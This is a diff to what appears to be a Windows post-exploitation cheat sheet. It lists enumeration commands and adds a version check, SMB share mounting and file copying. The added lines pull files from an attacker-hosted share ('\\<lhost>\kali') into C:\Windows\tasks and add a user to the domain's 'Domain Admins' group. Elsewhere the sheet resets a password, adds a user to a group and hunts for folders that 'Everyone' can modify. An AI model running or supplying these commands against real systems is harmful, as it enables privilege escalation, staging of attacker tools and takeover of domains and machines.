@@ -6,17 +6,17 @@ wmic qfe get Caption, Description, HotFixID, InstalledOn # installed hotfixes
 wmic product get name, version, vendor # installed software
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path # enum kernel/driver
 Get-Process -IncludeUserName | Select-Object Id,Name,Username,Path | Format-List
+cmd /c ver
 
 # users
 whoami /all
-whoami /priv
-whoami /groups
 net user
 net user /domain
 net user /domain some_user_name
 net user %username%
 net localgroup <group> <user> /add # add user to group
 net user admin Password1! # change password
+net group "Domain Admins" <user> /ADD /DOMAIN
 
 # network
 ipconfig /all
@@ -38,6 +38,9 @@ icacls "C:\"
 accesschk.exe -uws "Everyone" "C:\Program Files"
 Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
 dir *StickyNotes* /S /B
+net use u: \\<lhost>\kali /user:username password
+net use u: /d # unmount
+copy \\<lhost>\kali\<some-file> C:\Windows\tasks\<some-file>
 
 # autostart writeable
 C:\Windows\tasks\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
